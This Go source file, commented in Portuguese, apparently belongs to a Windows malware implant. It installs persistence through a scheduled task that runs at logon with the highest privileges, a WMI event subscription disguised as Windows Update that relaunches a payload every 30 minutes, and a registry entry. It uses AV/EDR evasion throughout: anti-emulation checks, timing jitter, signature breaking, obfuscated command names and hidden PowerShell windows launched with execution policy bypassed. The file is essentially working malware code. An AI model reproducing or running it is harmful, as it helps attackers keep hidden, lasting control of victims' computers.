package stealth

import (
	"fmt"
	"os/exec"
	"strings"
	"syscall"
)

// AdvancedPersistenceMethod representa diferentes métodos de persistência
type AdvancedPersistenceMethod int

const (
	MethodRegistry AdvancedPersistenceMethod = iota
	MethodScheduledTask
	MethodWMI
	MethodStartupFolder
)

// InstallScheduledTask cria uma Scheduled Task para persistência
// Método mais avançado e menos detectado que Registry Run
func InstallScheduledTask(executablePath string) error {
	// Anti-emulação
	if !AntiEmulation() {
		return fmt.Errorf("ambiente não seguro detectado")
	}

	// Delay aleatório para evitar detecção por timing
	RandomDelay()

	taskName := getRandomLegitimateNameWithoutExt()

	// Quebrar assinatura estática
	BreakSignature()

	// Construir comando dinamicamente para evitar assinatura estática
	cmdParts := []string{
		"/Create",
		"/TN", taskName,
		"/TR", fmt.Sprintf(`"%s"`, executablePath),
		"/SC", "ONLOGON",
		"/RL", "HIGHEST",
		"/F",
	}

	// Sleep adicional
	SleepWithJitter(500)

	cmd := exec.Command(GetDeobfuscated(obfStr_schtasks), cmdParts...)
	cmd.SysProcAttr = getSysProcAttr() // Ocultar janela

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("falha ao criar scheduled task: %w (output: %s)", err, string(output))
	}

	// Delay pós-criação
	RandomDelay()

	return nil
}

// RemoveScheduledTask remove a Scheduled Task
func RemoveScheduledTask() error {
	// Tentar remover todas as possíveis tasks criadas
	for _, name := range legitimateNames {
		taskName := strings.TrimSuffix(name, ".exe")
		cmd := exec.Command("schtasks", "/Delete", "/TN", taskName, "/F")
		_ = cmd.Run() // Ignorar erros
	}

	return nil
}

// IsScheduledTaskInstalled verifica se existe uma scheduled task instalada
func IsScheduledTaskInstalled() bool {
	for _, name := range legitimateNames {
		taskName := strings.TrimSuffix(name, ".exe")
		cmd := exec.Command("schtasks", "/Query", "/TN", taskName)
		if err := cmd.Run(); err == nil {
			return true
		}
	}

	return false
}

// InstallWMIPersistence usa WMI Event Subscription para persistência
// TÉCNICA MUITO AVANÇADA - Raramente detectada por AV/EDR convencionais
// Requer PowerShell e pode precisar de privilégios elevados
func InstallWMIPersistence(executablePath string) error {
	// Nome único para o filtro WMI
	filterName := "MicrosoftWindowsUpdateFilter"
	consumerName := "MicrosoftWindowsUpdateConsumer"

	// Script PowerShell para criar WMI Event Subscription
	// Trigger: A cada 30 minutos (intervalo configurável)
	psScript := fmt.Sprintf(`
$filterName = '%s'
$consumerName = '%s'
$exePath = '%s'

# Remover existente se houver
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq $filterName} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq $consumerName} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter.Name -eq $filterName} | Remove-WmiObject

# Criar filtro de evento (trigger a cada 30 minutos)
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 1800 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = $filterName
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = $Query
}

# Criar consumer (ação a ser executada)
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = $consumerName
    CommandLineTemplate = $exePath
    RunInteractively = $false
}

# Vincular filtro ao consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $EventFilter
    Consumer = $Consumer
}
`, filterName, consumerName, executablePath)

	// Delay anti-detecção
	RandomDelay()
	BreakSignature()

	// Executar PowerShell de forma oculta
	cmd := exec.Command(GetDeobfuscated(obfStr_powershell),
		"-NoProfile",
		"-NonInteractive",
		"-WindowStyle", "Hidden",
		"-ExecutionPolicy", "Bypass",
		"-Command", psScript,
	)
	cmd.SysProcAttr = getSysProcAttr()

	// Sleep antes de executar
	SleepWithJitter(800)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("falha ao criar WMI persistence: %w (output: %s)", err, string(output))
	}

	// Delay pós-execução
	RandomDelay()

	return nil
}

// RemoveWMIPersistence remove WMI Event Subscription
func RemoveWMIPersistence() error {
	filterName := "MicrosoftWindowsUpdateFilter"
	consumerName := "MicrosoftWindowsUpdateConsumer"

	psScript := fmt.Sprintf(`
$filterName = '%s'
$consumerName = '%s'

Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq $filterName} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq $consumerName} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter.Name -eq $filterName} | Remove-WmiObject
`, filterName, consumerName)

	cmd := exec.Command("powershell.exe",
		"-NoProfile",
		"-NonInteractive",
		"-WindowStyle", "Hidden",
		"-ExecutionPolicy", "Bypass",
		"-Command", psScript,
	)

	_ = cmd.Run() // Ignorar erros
	return nil
}

// IsWMIPersistenceInstalled verifica se WMI persistence está instalada
func IsWMIPersistenceInstalled() bool {
	filterName := "MicrosoftWindowsUpdateFilter"

	psScript := fmt.Sprintf(`
$filter = Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq '%s'}
if ($filter) { exit 0 } else { exit 1 }
`, filterName)

	cmd := exec.Command("powershell.exe",
		"-NoProfile",
		"-NonInteractive",
		"-WindowStyle", "Hidden",
		"-ExecutionPolicy", "Bypass",
		"-Command", psScript,
	)

	err := cmd.Run()
	return err == nil
}

// InstallMultiLayerPersistence instala múltiplas camadas de persistência
// para garantir que pelo menos uma sobreviva
func InstallMultiLayerPersistence(executablePath string) error {
	var lastError error
	successCount := 0

	// Tentar Registry (mais compatível)
	if err := createRegistryPersistence(executablePath); err == nil {
		successCount++
	} else {
		lastError = err
	}

	// Tentar Scheduled Task (mais robusto)
	if err := InstallScheduledTask(executablePath); err == nil {
		successCount++
	} else {
		lastError = err
	}

	if err := InstallWMIPersistence(executablePath); err == nil {
		successCount++
	} else {
		lastError = err
	}

	// Se pelo menos um método funcionou, considerar sucesso
	if successCount > 0 {
		return nil
	}

	return fmt.Errorf("falha em todos os métodos de persistência: %w", lastError)
}

// RemoveAllPersistence remove todas as camadas de persistência
func RemoveAllPersistence() error {
	// Remover Registry
	_ = RemovePersistence()

	// Remover Scheduled Tasks
	_ = RemoveScheduledTask()

	// Remover WMI
	_ = RemoveWMIPersistence()

	return nil
}

// getSysProcAttr retorna atributos para ocultar janela de comando
func getSysProcAttr() *syscall.SysProcAttr {
	return &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}
}
